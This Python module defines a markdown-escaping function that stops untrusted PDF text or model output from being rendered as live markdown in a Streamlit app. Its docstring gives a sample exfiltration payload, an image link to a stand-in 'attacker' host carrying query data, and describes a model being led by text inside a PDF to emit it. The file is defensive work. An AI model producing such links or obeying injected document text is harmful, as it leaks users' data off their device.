"""Render untrusted text (PDF content, model output, file names, error bodies) as plain text.

Streamlit's st.write/st.markdown/st.error all parse markdown. A malicious PDF, or a model that obeys
text inside one, could otherwise inject an image or link (`![](https://attacker/?q=...)`) and make the
browser fetch a remote URL, which breaks the "local only: nothing leaves this device" promise.

escape_markdown() backslash-escapes every ASCII punctuation character. CommonMark renders an escaped
character literally, so images, links, autolinks (`https://`, `www.`), HTML, emoji codes (`:smile:`),
math (`$..$`), colour directives and list/heading markers all become ordinary text. Non-ASCII text,
including Devanagari, is untouched.
"""
import string

_ESCAPE = {ord(c): "\\" + c for c in string.punctuation}


def escape_markdown(text: str) -> str:
    """Escape `text` so a markdown renderer shows it literally. Line breaks are kept."""
    return str(text).translate(_ESCAPE).replace("\n", "  \n")
